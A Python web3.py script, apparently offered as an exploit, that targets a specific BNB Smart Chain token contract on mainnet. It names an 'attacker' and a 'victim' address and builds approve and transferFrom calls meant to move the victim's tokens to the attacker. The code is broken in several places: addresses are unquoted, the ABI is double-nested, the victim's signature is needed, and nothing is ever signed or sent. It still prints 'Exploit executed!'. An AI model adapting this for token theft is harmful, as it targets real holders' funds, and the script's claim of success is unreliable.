from web3 import Web3

# Connect to local node or testnet
w3 = Web3(Web3.HTTPProvider("https://bsc-dataseed.binance.org"))

# Addresses
attacker = 0x9701b5f824873560ad5670De0891D8D80F998eBa  # replace with your attacker address
victim = 0xDA5eEeF71CE9892b79b0215E771153f84930A653    # replace with victim (has tokens)

# Set contract address and ABI
contract_address = "0xc461CE1893895ea6eA3dacFe03dbd14120BFf8ba"
abi = [[{"inputs":[{"internalType":"string","name":"name","type":"string"},{"internalType":"string","name":"symbol","type":"string"},{"internalType":"bytes32","name":"maxSupply","type":"bytes32"},{"internalType":"uint256","name":"supply","type":"uint256"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[],"name":"_maxSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"_totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"a","type":"address"}],"name":"isOwner","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]]  # Paste full ABI here

# Create contract instance
token = w3.eth.contract(address=contract_address, abi=abi)

# Step 1: Approve attacker from victim (simulate or do this manually if needed)
tx1 = token.functions.approve(attacker, 2**256 - 1).build_transaction({
    "from": victim,
    "nonce": w3.eth.get_transaction_count(victim),
    "gas": 200000,
    "gasPrice": w3.to_wei("5", "gwei")
})
# Sign and send with victim's private key

# Step 2: Attacker drains funds via transferFrom repeatedly
amount_to_steal = 100000 * 10**8  # change as needed
tx2 = token.functions.transferFrom(victim, attacker, amount_to_steal).build_transaction({
    "from": attacker,
    "nonce": w3.eth.get_transaction_count(attacker),
    "gas": 200000,
    "gasPrice": w3.to_wei("5", "gwei")
})
# Sign and send with attacker's private key

print("Exploit executed!")
